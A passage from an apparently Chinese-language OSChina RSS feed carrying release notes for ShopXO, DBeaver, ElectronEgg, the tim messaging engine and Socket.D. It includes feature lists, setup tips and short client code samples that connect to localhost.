                <![CDATA[ShopXO 免费开源商城系统 v5.0 版本已发布，精益求精]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>更新日志</strong><span style="background-color:#ffffff; color:#333333">&nbsp;</span></p><blockquote><p style="margin-left:0; margin-right:0">1.【优化】后台 UI 全新优化、极致体验<br> 2.【优化】上传附件组件增加组合和预览<br> 3.【优化】发票支持专用电子发票<br> 4.【优化】进销存商城同步到进销存支持多仓库对应同步、客户和供应商增加直接查看<br> 5.【优化】门店业务流程优化、小程序端支持门店购物车<br> 6.【优化】小程序适配百度和头条底部 tab<br> 7.【优化】搜索页面商品分类层级读取下级<br> 8.【优化】所有插件管理导航统一组件<br> 9.【新增】手机端支持 APP（IOS+Android）<br> 10.【新增】手机端支持多语言（中文、繁体、英文、西班牙）<br> 11.【新增】手机端我的中支持门店订单查看和下单自动进入门店订单<br> 12.【新增】手机端购物车支持优惠明显查看及选择<br> 13.【新增】短信对接多平台（腾讯、百度、云片、loginsms）<br> 14.【新增】第三方登录 APP 支持（微信、QQ、苹果、谷歌、本机号码）<br> 15.【新增】扫码收款和消息通知支持语音播报<br> 16.【新增】订单商品表单细节优化，新增类型（整数、邮箱、手机）、并支持手机端<br> 17.【新增】订单再次购买支持回购和加购物车选择<br> 18.【新增】头条支付支付企业担保<br> 19.【新增】插件支持自动批量更新<br> 20.【新增】后台新增常用功能<br> 21.【新增】新增商品评论管理<br> 22.【新增】新增下单备注预选择<br> 23.【新增】手机端商品分类页面带排序<br> 24.【新增】下单积分自定义<br> 25.【新增】优惠券支持默认选择（最优惠、快过期）</p></blockquote><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>手机端效果图片展示</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" height="1196" src="https://oscimg.oschina.net/oscnet/up-f2b963caf2bc60a72bf9dda00e2e0079988.png" width="2805" referrerpolicy="no-referrer"></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" src="https://oscimg.oschina.net/oscnet/up-11c86b81dc235406bea9d1949333e5fd2b3.png" referrerpolicy="no-referrer"></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><strong>PC 效果图片展示</strong></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left"><img alt="" src="https://oscimg.oschina.net/oscnet/up-c3871a3b0025e70f36a78d4bf02e50fb9b7.jpg" referrerpolicy="no-referrer"></p><p>&nbsp;</p><p><strong>后台管理，效果图片展示</strong></p><p><img alt="" src="https://oscimg.oschina.net/oscnet/up-706114353032fcca2a441cab6db8b6c7ef9.png" referrerpolicy="no-referrer"></p></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 02:45:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276327/shopxo-5-0-released</guid>
            <link>https://www.oschina.net/news/276327/shopxo-5-0-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[DBeaver 23.3.3 发布]]>
            </title>
            <description>
                <![CDATA[<div class="content"><p><span style="background-color:#ffffff; color:#333333">DBeaver 是一个免费开源的通用数据库工具，适用于开发人员和数据库管理员。DBeaver 23.3.3 现已发布，更新内容如下：</span></p><ul style="margin-left:0; margin-right:1.5em"><li>Metadata editor： 
  <ul style="margin-left:0; margin-right:0"><li>重新设计了对象创建对话框</li></ul></li><li>SQL Editor： 
  <ul style="margin-left:0; margin-right:0"><li>INSERT 语句的自动完成已修复</li><li>修复了高亮显示和验证的大小写敏感性问题</li><li>自动完成中重复的表别名已修复</li><li>列别名高亮显示已修复</li><li>变量名中不允许再次使用 Dot 字符</li></ul></li><li>Data Editor：重新显示列描述</li><li>Database Tasks：任务执行时间的显示已修复</li><li>ER Diagram:：修复了 unique/primary key 的一对一连接呈现</li><li>Data Transfer： 
  <ul style="margin-left:0; margin-right:0"><li>导出数据时所有列都可以标记为跳过</li><li>导出数据中排除了统计数据</li></ul></li><li>General： 
  <ul style="margin-left:0; margin-right:0"><li>修复了更改 monospace font 的问题</li><li>修复了 Unique key 创建的问题</li><li>改进了在 Linux 和 macOS 上查找本地客户端的功能</li></ul></li><li>Databases： 
  <ul style="margin-left:0; margin-right:0"><li>添加了 Altibase 支持</li><li>BigQuery：支持&nbsp;Structs 和 arrays</li><li>Dameng： 
    <ul style="margin-left:0; margin-right:0"><li>Dameng 驱动已更新</li><li>支持用户、角色和类别</li></ul></li><li>MySQL：本地客户端的路径已修复</li><li>MySQL 和 MariaDB：修复了具有唯一标识符渲染列的问题</li><li>PostgreSQL： 
    <ul style="margin-left:0; margin-right:0"><li>Schema permissions display 已修复</li><li>修复了 restore wizard 的清理选项的确认消息</li></ul></li><li>SQLite：使用「truncate target tables before load」选项导入已修复</li><li>SQL Server： 
    <ul style="margin-left:0; margin-right:0"><li>检查约束选项已从 <span style="background-color:#ffffff; color:#555555">primary/unique key&nbsp;</span>创建页面中删除</li><li>修复了在索引属性中显示来源的问题</li><li>SQL Server 驱动程序已更新</li></ul></li></ul></li><li>Localization： 
  <ul style="margin-left:0; margin-right:0"><li>日语本地化已更新</li></ul></li><li>Misc： 
  <ul style="margin-left:0; margin-right:0"><li>Microsoft Store 版本已修复</li><li>当工作区目录是链接时启动应用程序已修复</li></ul></li></ul><p>更新说明：<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdbeaver.io%2F2024%2F01%2F21%2Fdbeaver-23-3-3%2F" target="_blank">https://dbeaver.io/2024/01/21/dbeaver-23-3-3/</a></p></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 02:45:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276326/dbeaver-23-3-3-released</guid>
            <link>https://www.oschina.net/news/276326/dbeaver-23-3-3-released</link>
            <author>
                <![CDATA[来源: OSCHINA]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[ElectronEgg v3.10.0 ，让后端也能开发桌面软件]]>
            </title>
            <description>
                <![CDATA[<div class="content"><div><h4>值得信赖</h4><p style="color:#00323c; margin-left:0; margin-right:0; text-align:center">框架已经广泛应用于记账、政务、企业、医疗、学校、股票交易、ERP、娱乐、视频等领域客户端，请放心使用！</p><h4><strong><span>开源</span></strong></h4><p style="margin-left:0; margin-right:0; text-align:center"><span style="color:#40485b">gitee：</span><a href="https://gitee.com/dromara/electron-egg" target="_blank">https://gitee.com/dromara/electron-egg</a><span><span>&nbsp;43</span>00+</span></p><p style="margin-left:0; margin-right:0; text-align:center"><span style="color:#40485b">github：</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdromara%2Felectron-egg" target="_blank">https://github.com/dromara/electron-egg</a><span><span>&nbsp;14</span>00+</span></p><p style="margin-left:0; margin-right:0; text-align:center"><img height="895" src="https://oscimg.oschina.net/oscnet/up-7de0bc370a2efbcafa72ca04b83085de5e2.png" width="1897" referrerpolicy="no-referrer"></p></div><h2>本次更新</h2><div><div><div><strong>### 3.10.0</strong></div><div><strong>**【大更新】**</strong></div><div><div><div><span style="color:#0451a5">1.</span><span style="color:#3b3b3b"> 【优化】优化 ee-core 模块，支持 go、java 等。</span></div><div><span style="color:#0451a5">2.</span><span style="color:#3b3b3b"> 【增加】新增 ee-core cross 模块 API：run()\killAll()\kill(pid)\killByName(name)\getUrl(name)\getProcByName(name)\getProc(pid)getPids()。</span></div><div><span style="color:#0451a5">3.</span><span style="color:#3b3b3b"> 【增加】新增 ee-core &nbsp;cross 模块进程对象，包含 API：pid\name\port\config\child\emitter\kill()\getUrl()\getArgsObj()。</span></div><div><span style="color:#0451a5">4.</span><span style="color:#3b3b3b"> 【增加】新增 go、java 功能使用 demo。</span></div><div><span style="color:#0451a5">5.</span><span style="color:#3b3b3b"> 【修复】修复 electron/index 缓存问题。</span></div><div><span style="color:#0451a5">6.</span><span style="color:#3b3b3b"> 【修复】修复 jobs 日志写多了会卡死的问题。</span></div><div><span style="color:#0451a5">7.</span><span style="color:#3b3b3b"> 【修复】修复，第三方使用 model 错乱问题。</span></div><div><span style="color:#0451a5">8.</span><span style="color:#3b3b3b"> 【修改】修改，配置，默认开启 gpu，修改默认协议为 file://。</span></div><div><span style="color:#0451a5">9.</span><span style="color:#3b3b3b"> 【修改】修改 go 开发环境配置。</span></div><div><span style="color:#0451a5">10.</span><span style="color:#3b3b3b"> 【升级】升级 ee-core v2.8.0。</span></div></div><p>&nbsp;</p></div></div><p style="margin-left:0; margin-right:0"><img height="981" src="https://oscimg.oschina.net/oscnet/up-ff3f9c6b03e8cbe5eac5c29e55b0a46297b.png" width="1466" referrerpolicy="no-referrer"></p></div><h2>使用场景</h2><h3>1. 常规桌面软件&nbsp;</h3><ul><li><p style="margin-left:0; margin-right:0">windows 平台 - demo</p><p style="margin-left:0; margin-right:0"><img height="651" src="https://oscimg.oschina.net/oscnet/up-36dfe2c910028fe2335092668f429f1b14e.png" width="976" referrerpolicy="no-referrer"></p></li><li><p style="margin-left:0; margin-right:0">macOS 平台 - demo</p><p style="margin-left:0; margin-right:0"><img height="514" src="https://oscimg.oschina.net/oscnet/up-7fe23fb230b5fd6c5c9a5db4ba980240d3c.png" width="768" referrerpolicy="no-referrer"></p></li><li><p style="margin-left:0; margin-right:0"><span style="background-color:#ffffff; color:#40485b">linux 平台 - 国产 UOS、Deepin</span><span>&nbsp;</span>- demo</p><p style="margin-left:0; margin-right:0"><img height="703" src="https://oscimg.oschina.net/oscnet/up-21ac119f1b909a3bd01ea15860c23116dcb.png" width="992" referrerpolicy="no-referrer"></p></li><li><p style="margin-left:0; margin-right:0">linux 平台 (ubuntu) - demo</p></li><li><p style="margin-left:0; margin-right:0"><img height="946" src="https://oscimg.oschina.net/oscnet/up-bdcffde5db5e605fb4b56b408a1a90e68f2.png" width="1339" referrerpolicy="no-referrer"></p></li></ul><h3>2. vue、react、web 转换成桌面软件</h3><ul><li><p style="margin-left:0; margin-right:0">vue-ant-design（本地）</p><p style="margin-left:0; margin-right:0"><img height="1290" src="https://oscimg.oschina.net/oscnet/up-f62948e6737771c09978e5ca9cccbbfc138.png" width="2144" referrerpolicy="no-referrer"></p></li><li><p style="margin-left:0; margin-right:0">禅道项目管理（web 项目地址）</p><p style="margin-left:0; margin-right:0"><img alt="" src="https://kaka996.coding.net/p/resource/d/tx-resource/git/raw/master/img/electron-egg/ee-project-7.png" referrerpolicy="no-referrer"><img alt="" height="826" src="https://oscimg.oschina.net/oscnet/up-f2ec517e12505ceb5d54958f73b13c5eebe.png" width="1345" referrerpolicy="no-referrer"></p></li></ul><div><h3><span>3. 用户案例</span></h3><p style="margin-left:0; margin-right:0">&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://wallace5303.gitee.io/ee/images/electron-egg/aw/aw-3.png" referrerpolicy="no-referrer"></p></div><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">&nbsp; &nbsp;&nbsp;<img height="620" src="https://oscimg.oschina.net/oscnet/up-4c4d6f6195f0cf9cc4d9edae198f8664f01.png" width="1040" referrerpolicy="no-referrer"></p><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">&nbsp; &nbsp;&nbsp;<img height="708" src="https://oscimg.oschina.net/oscnet/up-49f3eabdbb8aeeff8fc1d984a6e9e8167bf.png" width="1114" referrerpolicy="no-referrer"></p><div><h2><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.kaka996.com%2Fpages%2Feadf46%2F" target="_blank">更多<span>案例</span></a></h2></div><p style="color:#333333; margin-left:0; margin-right:0; text-align:left">&nbsp; &nbsp;&nbsp;访问官网：<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.kaka996.com%2F" target="_blank">electron-egg: 一个入门简单、跨平台、企业级桌面软件开发框架</a></p></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 02:26:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276324/electron-egg-3-10-0-released</guid>
            <link>https://www.oschina.net/news/276324/electron-egg-3-10-0-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[去中心化分布式即时通讯引擎 tim v2.0.1 发布]]>
            </title>
            <description>
                <![CDATA[<div class="content"><blockquote><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Ftim" target="_blank"><span style="color:#4290f7"><u>Tim 即时通讯引擎</u></span></a><span style="color:#212529">的去中心化分布式架构具有去中心化、分布式数据存储、支持大规模用户、即时通讯、安全性和隐私保护、高可用性和容错性以及可扩展性和灵活性等特点。能够有效地解决大规模分布式系统的设计和实现问题，并提高系统的性能、可用性和扩展性。</span></blockquote><h3>tim v2.0.1 版本的更新内容</h3><ul><li>修复了已知 bug</li><li>增加了大字符串协议 Big String</li><li>增加了大字节流协议 Big Binary</li></ul><p>说明：big string，big binary 是一种无格式的松散数据协议，主要应用场景在一些特殊的场景下，对类似 thrift，json 等特定格式的协议无法支持的情况下使用。这种两种松散的协议，可以支持一个数据包被终端分包多次发送的情况。</p><hr><h4>tim 实现的开源实践项目<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Fwebtim" target="_blank">webtim</a></h4><p style="text-align:start"><strong>webtim 在线访问地址：</strong><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftim.tlnet.top%2F" target="_blank"><strong>https://tim.tlnet.top</strong></a></p><p style="text-align:start"><strong>webtim 项目本地部署：</strong><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Fwebtim-deploy" target="_blank"><strong>https://github.com/donnie4w/webtim-deploy</strong></a></p><p style="text-align:start"><span>说明：作者已经为 windows，linux, macos 等操作系统, 写好启动脚本，并打包放置相应的 webtim 执行文件。只需要执行 start 脚本，便可以在本地一键启动 webtim。启动后，可以在本地通过 tim 后台管理系统与 tldb 后台管理系统查看相关的数据。在</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Fwebtim-deploy" target="_blank"><span>webtim-deploy</span></a><span>项目 readme 中有介绍。通过数据，可以了解更多 tim 的实现机制。</span></p><ul><li><span><strong>在 linux 或 macos 上 ，本地部署 webtim 时，启动可能出现一些错误，如</strong></span></li><li><img alt="" height="498" src="https://oscimg.oschina.net/oscnet/up-c5ac75ffd76f81f35148b30bb8cf8f568c5.jpg" width="1541" referrerpolicy="no-referrer"></li></ul><p style="text-align:start"><span><strong>数据库生成 binlog 文件的权限问题：可以有两种方法解决</strong></span></p><ol><li><span>一是文件增加权限，如：chmod -R 777 tldb/_data/bin &nbsp;；再重新运行 ./start.sh</span></li><li><span>sudo 运行，如 sudo ./start.sh</span></li></ol><p style="text-align:start"><img alt="" height="439" src="https://oscimg.oschina.net/oscnet/up-a76212ebf298659c52757435cc4d2851407.jpg" width="1515" referrerpolicy="no-referrer"></p><p style="text-align:start"><strong>成功启动的全过程：</strong></p><p style="text-align:start"><img alt="" height="773" src="https://oscimg.oschina.net/oscnet/up-1be53057e6f516572690a8474fbfc7a7071.jpg" width="1515" referrerpolicy="no-referrer"></p><p style="text-align:start">最后出现 webtim start [:6060] 说明本地成功启动 webtim</p><hr><h4>Tim 的架构特点</h4><ol><li><strong>去中心化</strong>：Tim 采用去中心化的分布式架构，没有中心节点或控制单元。每个节点都是独立的，具有高度自治的特征。这种架构方式可以降低单点故障的风险，提高系统的可靠性和安全性。</li><li><strong>分布式数据存储</strong>：Tim 采用分布式存储算法，将数据分散存储在多个数据库节点上。这种存储方式可以提高数据的可靠性和安全性，并且能够更好地抵御数据丢失或损坏的问题。</li><li><strong>支持大规模用户</strong>：Tim 能够支持大规模用户同时在线，并保证消息的及时送达。通过优化的协议和序列化技术，Tim 能够高效地处理海量数据和请求，确保消息的快速传输和可靠交付。</li><li><strong>即时通讯</strong>：Tim 作为即时通讯 IM 引擎，强调信息的及时性和可达性。它采用高效的传输协议和序列化技术，优化消息的传递和接收，确保用户能够即时地交流和互动。</li><li><strong>安全性和隐私保护</strong>：Tim 重视用户信息的隐私和安全。通过加密技术和去中心化身份验证等手段，确保用户数据的安全和隐私不受侵犯。同时，内部开发人员也无法直接查询用户及通讯信息，增加了数据的安全性。</li><li><strong>高可用性和容错性</strong>：Tim 具有高可用性和容错性。由于采用去中心化分布式架构，即使某个节点出现故障，其他节点仍能继续工作，确保整体服务的连续性。这种设计方式提高了系统的可靠性和稳定性。</li><li><strong>可扩展性和灵活性</strong>：Tim 的分布式架构使其具有良好的可扩展性和灵活性。随着业务需求的增长，可以增加更多的节点来提高系统的处理能力和存储容量。同时，由于节点间的自由连接和交互，Tim 能够快速适应变化的需求和环境。</li></ol><p style="text-align:start">&nbsp;</p><h4>Tim 功能特性</h4><ol><li><span>去中心化分布式架构，支持 Nat 穿透集群节点，天然分布式架构，无需特殊配置，无最小节点数限制，零依赖，支持大规模集群。</span></li><li><span>支持多种数据库：TLDB，Mysql，PostgreSQL ，SQL Server，Oracle，Oceanbase 等</span></li><li><span>高度归纳 IM 通讯模式，从底层支持 1:1，1:N，N:N 通讯模式</span></li><li><span>从底层支持流数据发送，轻松支持直播，实时音视频等功能的开发</span></li><li><span>重视数据安全，从账号到通讯数据，都进行换算或加密，保证用户信息安全</span></li><li><span>实现分布式存储数据，解决海量数据存储的问题，支持动态扩容数据库节点。</span></li><li><span>具备单机高性能特点，协议序列化效率高，体积小。</span></li><li><span>从底层支持各种通讯类型，包括普通信息，撤回信息，信息阅后即焚等</span></li><li><span>支持各种自定义用户状态，对标 QQ 等类型 APP 的状态功能</span></li><li><span>支持群组，对标 QQ，微信等类型 APP 群组功能</span></li><li><span>支持多人实时流数据发送，对标抖音直播，视频连线，或多人实时视频会议等 app 的功能</span></li><li><span>支持同账号多终端同时登录，并支持通过配置进行限制，对标 QQ，微信多终端登录功能</span></li><li><span>支持 thrift 压缩，json，big string，big binary 等多种形式的客户端协议</span></li></ol><hr><ul><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Ftim" target="_blank"><span>TIM 官网</span></a><span><span>&nbsp;</span>&nbsp; &nbsp; &nbsp; &nbsp;</span></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Ftimdoc" target="_blank"><span>TIM 开发使用文档</span></a><span><span>&nbsp;</span>&nbsp; &nbsp; &nbsp; &nbsp;</span></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Ftim" target="_blank"><span>TIM 源码地址</span></a><span><span>&nbsp;</span>&nbsp; &nbsp; &nbsp; &nbsp;</span></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftim.tlnet.top%2F" target="_blank"><span>在线项目体验</span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Fdownload" target="_blank"><span>TIM 下载地址</span></a></li></ul><hr><h4><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2FTim-Practical-Article" target="_blank">tim 实践系列文章</a><span>&nbsp;</span>(文章持续更新中...)</h4><ul><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425142" target="_blank"><span><strong>《tim 实践系列——tim 协议与其他格式协议的比较》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425137" target="_blank"><span><strong>《tim 实践系列——tim 设计来源与设计模式》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425173" target="_blank"><span><strong>《tim 实践系列——如何使用 TimMessage 自定义各种消息</strong></span></a><span><strong>》</strong></span></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425172" target="_blank"><span><strong>《tim 实践系列——如何使用 TimPrecence 自定义各种用户状态》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425182" target="_blank"><span><strong>《tim 实践系列——虚拟房间的作用和如何使用》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425175" target="_blank"><span><strong>《tim 实践系列——用户如何实现，隐身，在线，忙碌等状态》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425174" target="_blank"><span><strong>《tim 实践系列——消息特点和如何在实际业务中使用》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425168" target="_blank"><span><strong>《tim 实践系列——tim 如何限制一个账号多个终端登录》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425171" target="_blank"><span><strong>《tim 实践系列——tim 信息安全与账号系统》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425170" target="_blank"><span><strong>《tim 实践系列——内置的好友关系和群组》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425181" target="_blank"><span><strong>《tim 实践系列——消息撤回，阅后即焚，等功能如何开发》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425179" target="_blank"><span><strong>《tim 实践系列——去中心化分布式架构特点》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425176" target="_blank"><span><strong>《tim 实践系列——分布式数据存储与动态数据库扩容》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425157" target="_blank"><span><strong>《tim 实践系列——如何架构支持百亿级别在线用户的即时消息系统》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425156" target="_blank"><span><strong>《tim 实践系列——接入外部账号系统，配置关系型数据库》</strong></span></a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftlnet.top%2Farticle%2F22425178" target="_blank"><span><strong>《tim 实践系列——tim 的限流，报文长度，连接数，请求频率》</strong></span></a></li><li><span><strong>《tim 实践系列——后台管理员接口的使用》</strong></span></li><li><span><strong>《tim 实践系列——账号安全措施》</strong></span></li><li><span><strong>《tim 实践系列——用户之间如何实现文件传输》</strong></span></li><li><span><strong>《tim 实践系列——微信实时音视频开发》</strong></span></li><li><span><strong>《tim 实践系列——抖音直播间的开发》</strong></span></li><li><span><strong>《tim 实践系列——多人实时视频会议，抖音直播间在线多人视频连线》</strong></span></li><li><span><strong>《tim 实践系列——如何实现对公众号订阅号等系统栏目的实时订阅》</strong></span></li><li><span><strong>《tim 实践系列——tim 产生的数据统计与建议》</strong></span></li><li><span><strong>《tim 实践系列——tim 配置系统参数要注意的地方》</strong></span></li><li><span><strong>《tim 实践系列——使用 tim 无数据库模式实现 web IM》</strong></span></li></ul><hr><h4>tim 相关工程项目</h4><ul><li>go 客户端 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;timgo：<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Ftimgo" target="_blank">https://github.com/donnie4w/timgo</a></li><li>java 客户端 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;atim：<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Fatim" target="_blank">https://github.com/donnie4w/atim</a></li><li>js 客户端 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;timjs：<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Ftimjs" target="_blank">https://github.com/donnie4w/timjs</a></li><li>后台接口示例 &nbsp; &nbsp; &nbsp;admintim： &nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Fadmintim" target="_blank">https://github.com/donnie4w/admintim</a></li><li>webtim 项目 &nbsp; &nbsp; &nbsp; &nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Ftimjs" target="_blank">https://github.com/donnie4w/webtim</a><span>&nbsp;</span>&nbsp; &nbsp; &nbsp;访问地址：<span>&nbsp;</span><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftim.tlnet.top%2F" target="_blank">https://tim.tlnet.top</a></li><li>tim 客户端协议 &nbsp;<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2Ftim-protocol" target="_blank">tim-protocol</a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fdonnie4w%2FTim-Practical-Article" target="_blank">《tim 实践系列文章》</a></li></ul><p style="text-align:start">&nbsp;</p><h4>tim 带来多方面的优势和作用</h4><ol><li><strong>提高开发效率</strong>：TIM 提供了丰富的功能模块和接口，简化了即时通讯应用的开发过程，减少了重复造轮子和从头开始摸索的时间。</li><li><strong>保障安全性能</strong>：TIM 具备强大的安全机制，能够保障用户数据和通信内容的安全性，防止数据泄露和恶意攻击。</li><li><strong>提供稳定服务</strong>：TIM 能够提供稳定可靠的即时通讯服务，确保用户沟通的连续性和可靠性。</li><li><strong>支持多种平台</strong>：TIM 可以跨平台、跨设备使用，支持多种操作系统和终端设备，满足不同用户的需求。</li><li><strong>丰富的扩展性</strong>：去中心化分布式的 TIM 具备超强扩展性，能够根据项目的需求进行水平扩展，方便进行二次开发和功能升级。</li><li><strong>降低维护成本</strong>：TIM 可以降低大量运维成本，TIM 集群，与分布式数据存储都依赖 TIM 本身算法完成，无需人为部署。</li></ol></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 02:20:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276323/tim-2-0-1-released</guid>
            <link>https://www.oschina.net/news/276323/tim-2-0-1-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
        <item>
            <title>
                <![CDATA[Socket.D v2.3.7 发布]]>
            </title>
            <description>
                <![CDATA[<div class="content"><h3>Socket.D</h3><p style="color:#24292e; text-align:start">是基于"事件"和"语义消息""流"的网络应用层协议。有用户说，「Socket.D 之于 Socket，尤如 Vue 之于 Js、Mvc 之于 Http」。支持 tcp, udp, ws, kcp 传输。协议特点可参考<a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fsocketd.noear.org%2Farticle%2F748" target="_blank">《官网介绍》</a>。</p><p style="color:#24292e; text-align:start"><span style="background-color:#f1c40f">pyton 已开发完成，再在测试中；go, rust, c++ 正在开发中。</span></p><h3>for java / for js 更新说明：</h3><ul><li>添加 Client::openOrThow() 方法，原 open() 不再出异常</li><li>添加 Session::liveTime 接口</li><li>添加 Entity.of 快捷方法</li><li>添加，连接协议对 meta 传递的支持</li><li>添加 Handshake:path 方法</li><li>添加 CodecReader::peekByte 方法，标准化字符串解码</li><li>调整，发送时允许实体为 null（总有不需要传的时候）</li><li>调整 ClientChannel 内部处理，支持首次连接失败后仍可用</li><li>简化 ClientBase::open() 处理</li><li>优化 Codec::decodeString 处理方式</li></ul><h3>新增的接口体验：</h3><ul><li>两种打开方式</li></ul><pre><code class="language-java"><em>//如果不能连接正常返回（由心跳尝试不断连接）//用 java 示例</em><span style="color:#986801">let</span><span style="color:#986801">session</span><span>=</span> SocketD.createClient(<span style="color:#50a14f">"sd:tcp://127.0.0.1:8602/?u=a&amp;p=2"</span>)
        .open();

<em>//如果不能连接则异常 // 用 js 示例</em><span style="color:#986801">const</span><span style="color:#986801">session</span><span>=</span> await SocketD.createClient(<span style="color:#50a14f">"sd:</span><span style="color:#50a14f">ws://127.0.0.1:8602/?u=a&amp;p=2"</span>)</code><code class="language-java">        .openOrThow();
</code></pre><ul><li>支持用 null 发空实体</li></ul><pre><code class="language-java"><em>//等待模式</em><span style="color:#986801">let</span><span style="color:#986801">reply</span><span>=</span> session.sendAndRequest(<span style="color:#50a14f">"/user/get"</span>, <span style="color:#0184bb">null</span>).await();

<em>//回调模式</em>
session.sendAndRequest(<span style="color:#50a14f">"/user/get"</span>, <span style="color:#0184bb">null</span>).thenReply(reply-&gt;{

});
</code></pre><ul><li>支持活动时间获取</li></ul><pre><code class="language-java">console.info(session.liveTime());
</code></pre><h3>Socket.D.js 能力演示：</h3><ul><li>监听（相当于 ws 的增强）</li></ul><p style="color:#24292e; text-align:start">多了事件路由。可以用一个连接，监听不同的业务事件（类似于 http path）。</p><pre><code class="language-javascript"><em>//打开客户端会话（用 url 形式打开）</em><span style="color:#a626a4">let</span> session = <span style="color:#a626a4">await</span><span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">createClient</span>(<span style="color:#50a14f">"sd:</span><span style="color:#50a14f">ws://127.0.0.1:8602/?token=1b0VsGusEkddgr3d"</span>)</code><code class="language-javascript">        .<span style="color:#4078f2">listen</span>(<span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEventListener</span>()
                .<span style="color:#4078f2">doOnOpen</span>(s -&gt; { <em>//会话打开时</em><em>//...</em>
